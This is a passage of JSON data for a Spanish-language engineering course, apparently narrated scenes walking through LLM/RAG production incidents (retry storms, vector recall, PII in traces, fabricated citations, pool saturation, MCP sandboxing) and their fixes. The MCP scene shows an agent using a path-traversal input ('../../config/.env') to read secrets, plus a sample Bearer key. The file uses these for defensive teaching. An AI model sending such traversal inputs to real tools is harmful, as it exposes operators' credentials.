+    "kicker": "INCIDENTE S05 · FINOPS RETRY STORM",
+    "heading": "Agotamiento de Presupuesto FinOps por Tormenta de Reintentos",
+    "ctaLabel": "Ir al Decision Lab S05",
+    "ctaHref": "#/senior/S05/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Alerta Factura",
+        "title": "$4,800 Quemados en 40 Minutos Durante Degradación Parcial",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Incidente financiero en S05: un bucle de autocorrección en LangGraph combinado con cinco reintentos HTTP consumió cuatro mil ochocientos dólares en cuarenta minutos.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "storm",
+          "statusBadge": "5 x 5 = 25 LLM CALLS / REQUEST",
+          "laneA": {
+            "name": "Capa LangGraph",
+            "steps": [
+              "Valida JSON",
+              "Error Schema",
+              "Reintenta 5 veces"
+            ]
+          },
+          "laneB": {
+            "name": "Capa SDK HTTP",
+            "steps": [
+              "Timeout 429/503",
+              "Reintenta 5 veces c/u",
+              "Burn Rate x25"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "02 · Multiplicador",
+        "title": "Reintentos Anidados sin Tope Atómico de Presupuesto",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Es el efecto multiplicador de los reintentos anidados. Cinco pasos de grafo multiplicados por cinco reintentos del SDK son veinticinco llamadas costosas por un solo request.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Graph Retries: 5",
+              "sub": "Sin token budget",
+              "state": "hot"
+            },
+            {
+              "label": "SDK Retries: 5",
+              "sub": "Sin Jitter ni Cap",
+              "state": "hot"
+            },
+            {
+              "label": "Ledger FinOps",
+              "sub": "Sin Hard Stop",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Amplificación de Tráfico y Costo",
+          "metricBefore": "1 petición base",
+          "metricAfter": "25x llamadas en fallo"
+        }
+      },
+      {
+        "chapter": "03 · Contención",
+        "title": "¿Cómo Detener la Sangría Antes de Agotar el Tenant?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Dónde colocamos el freno para cortar esa tormenta en cuanto falla el proveedor?",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s05_finops_retry_storm/lab.py",
+          "before": [
+            "retry_count += 1 # ❌ sin presupuesto restante"
+          ],
+          "after": [
+            "if attempt >= max_attempts or remaining_budget_usd < est_cost:",
+            "    return BudgetExhaustedError('Abort before retry storm')"
+          ],
+          "callout": "Reserva presupuesto ANTES de cada intento, incluidos los reintentos."
+        }
+      },
+      {
+        "chapter": "04 · Retry Budget",
+        "title": "Presupuesto Atómico por Intento + Circuit Breaker",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 10,
+        "speech": "En un ledger atómico compartido entre capas. Cada reintento consume cuota de retry budget, respeta backoff con jitter y se aborta al instante cuando el presupuesto restante llega a cero.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s05_finops_retry_storm / test_lab.py",
+          "badge": "HARD STOP",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "can_retry(attempt=3, max_cap=3, budget_rem=0.00)",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Stops immediately at cap and zero remaining budget",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s06",
+    "aliases": [
+      "S06",
+      "s06"
+    ],
+    "filename": "senior-s06.mp3",
+    "kicker": "INCIDENTE S06 · HNSW RECALL COLLAPSE",
+    "heading": "Caída Severa de Recall@K en HNSW con Filtros ACL Selectivos",
+    "ctaLabel": "Ir al Decision Lab S06",
+    "ctaHref": "#/senior/S06/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Cero Resultados",
+        "title": "Tenants Pequeños Reciben Respuestas Vacías con Índice Activo",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Misterio en S06: los documentos existen en PostgreSQL y la búsqueda exacta los encuentra, pero con el índice HNSW activo los clientes pequeños reciben cero resultados.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Tenant < 0.5% del Corpus",
+          "claims": [
+            {
+              "key": "Total Vectores",
+              "value": "1,000,000 rows",
+              "valid": true
+            },
+            {
+              "key": "Docs de t_small",
+              "value": "4,500 (0.45%)",
+              "valid": false
+            }
+          ],
+          "indexLabel": "pgvector HNSW por defecto",
+          "chunks": [
+            {
+              "id": "RES-EMPTY",
+              "text": "0 chunks retornados en ef_search=40",
+              "note": "El grafo se detuvo visitando nodos de otros tenants",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Por qué Pasa",
+        "title": "Filtros Muy Selectivos vs Recorrido Fijo del Grafo HNSW",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "En pgvector tradicional, el índice HNSW explora los cuarenta vecinos más cercanos globales y recién verifica tu WHERE ACL al final. Si ese tenant pesa menos del uno por ciento, se quedan vacíos.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Grafo HNSW",
+              "sub": "Visita 40 globales",
+              "state": "normal"
+            },
+            {
+              "label": "WHERE t_small",
+              "sub": "0.45% coincidencia",
+              "state": "hot"
+            },
+            {
+              "label": "Recall@10",
+              "sub": "Colapsa al 10%",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Degradación por Selectividad Extrema",
+          "metricBefore": "Scan Exacto: 100%",
+          "metricAfter": "HNSW sin scan: <15%"
+        }
+      },
+      {
+        "chapter": "03 · La Solución",
+        "title": "Cómo Mantener Velocidad HNSW sin Perder Recall@K",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Activamos iterative_scan o particionamos por tenant para recuperarlo?",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s06_hnsw_acl_recall/lab.py",
+          "before": [
+            "SET LOCAL hnsw.iterative_scan = off; -- ❌ recall collapse"
+          ],
+          "after": [
+            "SET LOCAL hnsw.iterative_scan = relaxed_order;",
+            "SET LOCAL hnsw.max_scan_tuples = 20000;"
+          ],
+          "callout": "Mide Recall@K por segmento de tamaño de tenant en tus Evals."
+        }
+      },
+      {
+        "chapter": "04 · Validación",
+        "title": "Escaneo Iterativo + Benchmark de Tenants Pequeños en CI",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Activa hnsw.iterative_scan en relaxed_order con límite de tuplas escaneadas, y evalúa Recall@K específicamente sobre tenants con menos del uno por ciento del corpus.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s06_hnsw_acl_recall / test_lab.py",
+          "badge": "RECALL OK",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "evaluate_recall_by_tenant_bucket(corpus_share=0.004)",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ off: 0.12 (ALERT) -> relaxed_order: 0.96 (PASS)",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s07",
+    "aliases": [
+      "S07",
+      "s07"
+    ],
+    "filename": "senior-s07.mp3",
+    "kicker": "INCIDENTE S07 · EMBEDDING DRIFT",
+    "heading": "Mezcla Silenciosa de Modelos de Embedding e Incompatibilidad Vectorial",
+    "ctaLabel": "Ir al Decision Lab S07",
+    "ctaHref": "#/senior/S07/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Falla Silenciosa",
+        "title": "Misma Dimensión 1024, Espacios Geométricos Incompatibles",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Alerta en S07: cambiamos el modelo de embedding de consultas manteniendo mil veinticuatro dimensiones. SQL no lanzó error, pero el Recall@5 cayó del ochenta y nueve al once por ciento.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Modelo Consulta v2 (1024d)",
+          "claims": [
+            {
+              "key": "query_vec",
+              "value": "model_b@1024",
+              "valid": false
+            },
+            {
+              "key": "stored_vec",
+              "value": "model_a@1024",
+              "valid": true
+            }
+          ],
+          "indexLabel": "Producto Punto sin Sentido",
+          "chunks": [
+            {
+              "id": "RECALL 11%",
+              "text": "SQL ejecuta <=> sin error de tipo vector(1024)",
+              "note": "Cada modelo orienta sus ejes en geometrías distintas",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Igual Dimensión No Implica Compatibilidad Semántica",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 8,
+        "speech": "pgvector solo valida el número de dimensiones, no el modelo ni su versión. Comparar vectores de modelos distintos produce similitudes aleatorias en silencio.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s07_embedding_mismatch/lab.py",
+          "before": [
+            "WHERE tenant_id = $1 ORDER BY embedding <=> $2 -- ❌ ciego al modelo"
+          ],
+          "after": [
+            "WHERE tenant_id = $1 AND embedding_model = $3",
+            "-- Guard previo: assert query.model == row.embedding_model"
+          ],
+          "callout": "Versiona embedding_model y embedding_dim en cada tabla vectorial."
+        }
+      },
+      {
+        "chapter": "03 · Migración Cero Downtime",
+        "title": "¿Cómo Actualizar el Modelo sin Apagar Búsquedas?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Cómo migramos millones de chunks a un modelo nuevo sin romper el servicio?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "BLUE-GREEN INDEX MIGRATION",
+          "laneA": {
+            "name": "1. Expand",
+            "steps": [
+              "Columna model_v2",
+              "Backfill idempotente",
+              "Índice HNSW v2"
+            ]
+          },
+          "laneB": {
+            "name": "2. Cutover",
+            "steps": [
+              "Dual-write activo",
+              "Eval Recall >= 92%",
+              "Switch & Drop v1"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Contrato Estricto",
+        "title": "Validación de Modelo Versionado y Doble Escritura",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Guarda embedding_model en la columna de metadatos, exige igualdad estricta antes de calcular distancias y haz backfill en paralelo antes de cambiar el puntero de lectura.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s07_embedding_mismatch / test_lab.py",
+          "badge": "GUARDED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "compare(query_model='v2@1024', doc_model='v1@1024')",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ ModelMismatchError raised safely before similarity ranking",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s08",
+    "aliases": [
+      "S08",
+      "s08"
+    ],
+    "filename": "senior-s08.mp3",
+    "kicker": "INCIDENTE S08 · OTEL PII LEAK",
+    "heading": "Fuga de PII y Secretos en Trazas OpenTelemetry y Langfuse",
+    "ctaLabel": "Ir al Decision Lab S08",
+    "ctaHref": "#/senior/S08/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Auditoría Seguridad",
+        "title": "Historias Clínicas y Tokens Bearer Expuestos en Spans",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Fallo grave de privacidad en S08: nuestra auto-instrumentación OpenTelemetry capturó prompts crudos con datos médicos y tokens Bearer visibles para toda ingeniería.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "otel-span-unredacted.json",
+          "badge": "PII LEAK",
+          "lines": [
+            {
+              "prompt": "!",
+              "text": "span['gen_ai.prompt'] = 'Paciente DNI 40219822...'",
+              "tone": "warn"
+            },
+            {
+              "prompt": "!",
+              "text": "span['http.auth'] = 'Bearer sk-live-994812abc'",
+              "tone": "warn"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Capturar Cuerpos Completos sin Procesador de Redacción",
+        "speaker": "axon",
+        "mascot": "debug",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Muchos SDKs de observabilidad graban el input completo por defecto. Eso convierte tus trazas y plataformas de monitoreo en un repositorio ilegal de PII y credenciales.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s08_otel_pii_redaction/lab.py",
+          "before": [
+            "span.set_attributes({'raw_prompt': prompt, 'headers': headers})"
+          ],
+          "after": [
+            "safe = redact_span({'prompt_hash': sha256(prompt), 'tokens_in': n,",
+            "                    'latency_ms': ms}) # 0% PII ni Bearer tokens"
+          ],
+          "callout": "Observa métricas, hashes y trace_id; nunca texto clínico o tokens crudos."
+        }
+      },
+      {
+        "chapter": "03 · Qué Sí Grabar",
+        "title": "¿Cómo Depuramos Prompts Malos Sin Ver Datos de Clientes?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y cómo diagnosticamos regresiones si ocultamos el contenido del prompt?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "ZERO-PII OBSERVABILITY",
+          "laneA": {
+            "name": "Span Público",
+            "steps": [
+              "trace_id + tenant",
+              "prompt_version + hash",
+              "tokens + cost_usd"
+            ]
+          },
+          "laneB": {
+            "name": "Bóveda Segregada",
+            "steps": [
+              "Scrubbing Regex PII",
+              "TTL Corto Cifrado",
+              "Solo con Consentimiento"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Redacción",
+        "title": "SpanProcessor con Redacción Determinista y Golden Evals",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Correlas trace_id con versión de prompt, conteo de tokens, latencia y hashes, mientras aplicas un SpanProcessor que elimina raw_prompt y redacta cualquier secreto antes de exportar.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s08_otel_pii_redaction / test_lab.py",
+          "badge": "REDACTED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "sanitize_span({'raw_prompt': 'secret', 'auth': 'Bearer xyz'})",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ raw_prompt stripped · Bearer redacted -> [REDACTED]",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s09",
+    "aliases": [
+      "S09",
+      "s09"
+    ],
+    "filename": "senior-s09.mp3",
+    "kicker": "INCIDENTE S09 · CITATION GROUNDING",
+    "heading": "Alucinación de Citas e Identificadores Inventados en Respuestas Legales",
+    "ctaLabel": "Ir al Decision Lab S09",
+    "ctaHref": "#/senior/S09/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · JSON Engañoso",
+        "title": "Contrato Zod Válido pero con Artículo Legal Inexistente",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Alerta en S09: nuestro asistente legal devolvió un objeto JSON perfectamente tipado, pero citó el artículo NORM-994 que jamás estuvo en los documentos recuperados.",
+        "visual": {
+          "kind": "rag-acl",
+          "mode": "leak",
+          "identityLabel": "Evidencia Recuperada",
+          "claims": [
+            {
+              "key": "Chunk [0]",
+              "value": "id: \"ART-102\"",
+              "valid": true
+            },
+            {
+              "key": "Cita LLM",
+              "value": "id: \"NORM-994\" ❌",
+              "valid": false
+            }
+          ],
+          "indexLabel": "Fallo de Grounding",
+          "chunks": [
+            {
+              "id": "ZOD OK?",
+              "text": "Zod solo validó que citations sea string[]",
+              "note": "No comprobó pertenencia al conjunto recuperado",
+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Trampa Semántica",
+        "title": "Validar Estructura No Verifica Veracidad ni Soporte",
+        "speaker": "axon",
+        "mascot": "reading",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Zod valida sintaxis, no verdad. Si el LLM memoriza identificadores durante el preentrenamiento o inventa un código plausible, un esquema genérico lo deja pasar como cierto.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s09_citation_grounding/lab.py",
+          "before": [
+            "validate_json_schema(output) # ❌ no cruza contra retrieved_ids"
+          ],
+          "after": [
+            "cited = {c.chunk_id for c in output.citations}",
+            "if not cited or not cited.issubset(allowed_retrieved_ids): return abstain()"
+          ],
+          "callout": "Intersección estricta en servidor entre citas emitidas y chunks recuperados."
+        }
+      },
+      {
+        "chapter": "03 · Abstención",
+        "title": "¿Qué Debe Hacer el Sistema si No Hay Evidencia Suficiente?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y si al verificar las citas descubrimos que ningún fragmento respalda la respuesta?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "VERIFIED CITATIONS OR ABSTAIN",
+          "laneA": {
+            "name": "Checks",
+            "steps": [
+              "Zod Schema",
+              "Subset(retrieved_ids)",
+              "Faithfulness"
+            ]
+          },
+          "laneB": {
+            "name": "Salida Segura",
+            "steps": [
+              "Cita real clicable",
+              "Si falla -> Abstención",
+              "Cero inventos"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Grounding Gate",
+        "title": "Verificación Server-Side y Política Explícita de Abstención",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Abstenerse explícitamente. Es cien veces mejor responder que no existe soporte documental verificado, que inventar una norma jurídica con falsa autoridad.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s09_citation_grounding / test_lab.py",
+          "badge": "GROUNDED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "verify_citations(['NORM-994'], allowed={'ART-102'})",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Fabricated citation rejected -> abstained safely",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s10",
+    "aliases": [
+      "S10",
+      "s10"
+    ],
+    "filename": "senior-s10.mp3",
+    "kicker": "INCIDENTE S10 · DB POOL SATURATION",
+    "heading": "Saturación de Pool PostgreSQL durante Ingesta Masiva y Tráfico RAG",
+    "ctaLabel": "Ir al Decision Lab S10",
+    "ctaHref": "#/senior/S10/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Colapso en Vivo",
+        "title": "50,000 Manuales con Promise.all Agotan max_connections",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Saturación total en S10: reindexar cincuenta mil manuales en batch agotó todas las conexiones de PostgreSQL y elevó el p95 del chat en vivo a diecinueve segundos.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Ingesta Batch",
+              "sub": "Promise.all sin tope",
+              "state": "hot"
+            },
+            {
+              "label": "Postgres Pool",
+              "sub": "100/100 ocupadas",
+              "state": "hot"
+            },
+            {
+              "label": "RAG Online",
+              "sub": "p95 = 19,000 ms ❌",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Disponibilidad del Buscador en Vivo",
+          "metricBefore": "SLO p95: 350 ms",
+          "metricAfter": "Timeout PoolExhausted"
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Mezclar Tráfico Interactivo con Workers Batch en el Mismo Pool",
+        "speaker": "axon",
+        "mascot": "building",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Compartiste un único pool de conexiones sin bulkhead ni backpressure. Los workers batch devoraron cada slot dejando sin oxígeno las consultas vectoriales de los usuarios.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "BULKHEAD POOL ISOLATION",
+          "laneA": {
+            "name": "Online RAG Pool",
+            "steps": [
+              "80% capacidad fija",
+              "Read Replica",
+              "p95 < 120 ms"
+            ]
+          },
+          "laneB": {
+            "name": "Ingestion Worker",
+            "steps": [
+              "Semáforo concurr <= 4",
+              "Batches idempotentes",
+              "Yield si carga alta"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "03 · Presupuesto Pool",
+        "title": "¿Qué Regla Protege Siempre al Tráfico de Lectura?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Cuántas conexiones debemos reservar obligatoriamente para el asistente online?",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s10_db_pool_isolation/lab.py",
+          "before": [
+            "worker_conns = db_max_conns # ❌ hambrea al tráfico vivo"
+          ],
+          "after": [
+            "online_reserved = int(db_max_conns * 0.75)",
+            "batch_budget = min(requested_batch, db_max_conns - online_reserved)"
+          ],
+          "callout": "Reserva mínima intocable para online + concurrencia acotada en ingesta."
+        }
+      },
+      {
+        "chapter": "04 · Aislamiento",
+        "title": "Pools Separados, Semáforo y Cola Resiliente",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Reserva al menos setenta por ciento para el RAG online, aísla la ingesta en un worker pool con semáforo estricto y ejecuta upsert idempotente por lotes acotados.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s10_db_pool_isolation / test_lab.py",
+          "badge": "ISOLATED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "allocate_pool(total=100, online_floor=70, batch_req=80)",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ online=70 (SLO safe) · batch_capped=30",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s11",
+    "aliases": [
+      "S11",
+      "s11"
+    ],
+    "filename": "senior-s11.mp3",
+    "kicker": "INCIDENTE S11 · MCP SANDBOXING",
+    "heading": "Escalada de Privilegios y Path Traversal en Servidor MCP Interno",
+    "ctaLabel": "Ir al Decision Lab S11",
+    "ctaHref": "#/senior/S11/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Ruta Escapada",
+        "title": "Un Agente Lee Variables de Entorno con '../.env'",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Alerta crítica en S11: nuestro servidor MCP de documentos acepta rutas con dos puntos barra y ejecuta operaciones usando una única credencial maestra de administrador.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "mcp-audit-trail.log",
+          "badge": "CVE RISK",
+          "lines": [
+            {
+              "prompt": "!",
+              "text": "read_doc(path='../../config/.env') -> 200 OK (SECRET EXPOSED)",
+              "tone": "warn"
+            },
+            {
+              "prompt": "!",
+              "text": "db_query(sql='SELECT * FROM billing') -> ADMIN ROLE ❌",
+              "tone": "warn"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "Confiar en Rutas Crudas y Credenciales Compartidas de Dios",
+        "speaker": "axon",
+        "mascot": "debug",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Dos pecados mortales en MCP: unir rutas sin resolver su ruta real dentro de la raíz permitida, y olvidarse de propagar la identidad mínima del usuario final a cada herramienta.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s11_mcp_sandboxing/lab.py",
+          "before": [
+            "target = os.path.join(BASE_DIR, user_path) # ❌ vulnerable a '../'"
+          ],
+          "after": [
+            "real_base = BASE_DIR.resolve()",
+            "target = (real_base / user_path).resolve()",
+            "if not target.is_relative_to(real_base): raise SandboxError()"
+          ],
+          "callout": "Canonicaliza siempre con resolve() y exige symlinks dentro de BASE_DIR."
+        }
+      },
+      {
+        "chapter": "03 · Mínimo Privilegio",
+        "title": "¿Cómo Evitamos que un Usuario Consulte Tablas de Otros?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y qué credencial debe usar el servidor MCP cuando llama a base de datos o APIs?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "LEAST PRIVILEGE · OAUTH SCOPE",
+          "laneA": {
+            "name": "Filesystem MCP",
+            "steps": [
+              "realpath resolve()",
+              "is_relative_to(base)",
+              "Sólo extensión .md/.pdf"
+            ]
+          },
+          "laneB": {
+            "name": "Identidad MCP",
+            "steps": [
+              "Token delegado usuario",
+              "Scopes read-only",
+              "Audit Log firmado"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Sandbox Sólido",
+        "title": "Canonicalización Estricta + Tokens con Scope Reducido",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Un token con alcance reducido por usuario y sesión, jamás un superusuario compartido. Sumado a resolve() y allowlist de herramientas, bloqueas traversal y escalada de privilegios.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s11_mcp_sandboxing / test_lab.py",
+          "badge": "SANDBOXED",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "resolve_sandboxed('/srv/docs', '../.env')",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ SandboxViolation: parent traversal blocked",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s12",
+    "aliases": [
+      "S12",
+      "s12"
+    ],
+    "filename": "senior-s12.mp3",
+    "kicker": "INCIDENTE S12 · TEMPORAL LEAKAGE",
+    "heading": "Data Leakage Temporal en Datasets de Evaluación y Calibración",
+    "ctaLabel": "Ir al Decision Lab S12",
+    "ctaHref": "#/senior/S12/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · Métrica Falsa",
+        "title": "97% de Éxito en Lab, Fracaso en Producción Real",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "Paradoja en S12: nuestras evaluaciones reportan noventa y siete por ciento de acierto en CI, pero en producción las quejas por respuestas erróneas no paran de subir.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Split Aleatorio",
+              "sub": "Mezcla fechas futuras",
+              "state": "hot"
+            },
+            {
+              "label": "Corpus Indexado",
+              "sub": "Incluye resolución",
+              "state": "hot"
+            },
+            {
+              "label": "Eval CI: 97%",
+              "sub": "Falsa confianza",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Integridad del Benchmark Offline",
+          "metricBefore": "Random Split 80/20",
+          "metricAfter": "TIME LEAKAGE DETECTADO"
+        }
+      },
+      {
+        "chapter": "02 · Causa Raíz",
+        "title": "El Golden Set Filtraba Respuestas Posteriores en el Tiempo",
+        "speaker": "axon",
+        "mascot": "reading",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Al partir el dataset de forma aleatoria o ingerir tickets resueltos después de la pregunta, el modelo y tu umbral hacen trampa leyendo información del futuro.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "s12_evals_temporal_leakage/lab.py",
+          "before": [
+            "train, test = random_split(records, 0.8) # ❌ fuga temporal"
+          ],
+          "after": [
+            "assert max(r.ts for r in train) < min(r.ts for r in test)",
+            "# Snapshot del corpus congelado en cutoff_ts"
+          ],
+          "callout": "Todo dato de entrenamiento o snapshot RAG debe preceder al conjunto de test."
+        }
+      },
+      {
+        "chapter": "03 · Calibración",
+        "title": "¿Cómo Medimos con Honestidad Antes de Desplegar?",
+        "speaker": "host",
+        "mascot": "idea",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Qué regla de oro garantiza que los Evals representen la realidad del cliente?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "CHRONOLOGICAL CUTOFF SPLIT",
+          "laneA": {
+            "name": "1. Corte Temporal",
+            "steps": [
+              "Cutoff T0 estricto",
+              "Corpus <= T0",
+              "Golden Queries > T0"
+            ]
+          },
+          "laneB": {
+            "name": "2. Métricas",
+            "steps": [
+              "Recall@K real",
+              "Faithfulness Ragas",
+              "Casos Abstención"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Honestidad Eval",
+        "title": "Partición Cronológica + Congelación del Snapshot Vectorial",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Aplica partición estrictamente cronológica, congela la fotografía del corpus antes de la fecha de evaluación e incluye ejemplos negativos que exijan abstención.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "s12_evals_temporal_leakage / test_lab.py",
+          "badge": "CLEAN SPLIT",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "validate_temporal_split(train_end='2026-06-01', eval_start='2026-05-20')",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Overlap rejected automatically in CI Eval Gate",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "senior-s13",
+    "aliases": [
+      "S13",
+      "s13"
+    ],
+    "filename": "senior-s13.mp3",
+    "kicker": "INCIDENTE S13 · P99 TTFT LATENCY",
+    "heading": "Degradación de Latencia p99 por Reranking No Acotado y Contextos Gigantes",
+    "ctaLabel": "Ir al Decision Lab S13",
+    "ctaHref": "#/senior/S13/decision-lab",
+    "scenes": [
+      {
+        "chapter": "01 · 11 Segundos TTFT",
+        "title": "El Usuario Abandona Antes de la Primera Palabra",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 8,
+        "speech": "En S13 el time-to-first-token escaló a once segundos. Descubrimos que mandan doscientos chunks al reranker en CPU y meten cuarenta chunks completos en el prompt.",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Top-200 Candidatos",
+              "sub": "Rerank CPU: 7.4 s",
+              "state": "hot"
+            },
+            {
